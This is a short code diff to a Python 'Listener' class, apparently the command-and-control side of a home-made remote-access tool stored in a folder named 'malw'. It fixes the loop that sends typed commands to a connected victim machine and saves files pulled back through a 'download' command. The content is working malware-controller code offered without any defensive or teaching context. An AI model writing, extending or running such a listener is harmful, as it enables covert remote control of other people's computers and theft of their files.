@@ -80,16 +80,21 @@ class Listener:
         while True:
             command = input("-> ")
 
-            result = self.remote(command)
             command_parts = command.split(" ")
+            result = self.remote(command)
+            
 
-            if command[0] == "download":
+            if command.startswith("download "):
+
                 filename = command_parts[1]
+
                 download_path = f"/Users/bartu/Developer/python/malw/beylerbeyi/{filename}"
 
                 result = self.write_file(download_path, result)
 
-            print(result)
+                print(result)
+            else:
+                print(result)
 
 
 my_listener = Listener("127.0.0.1", 4040)
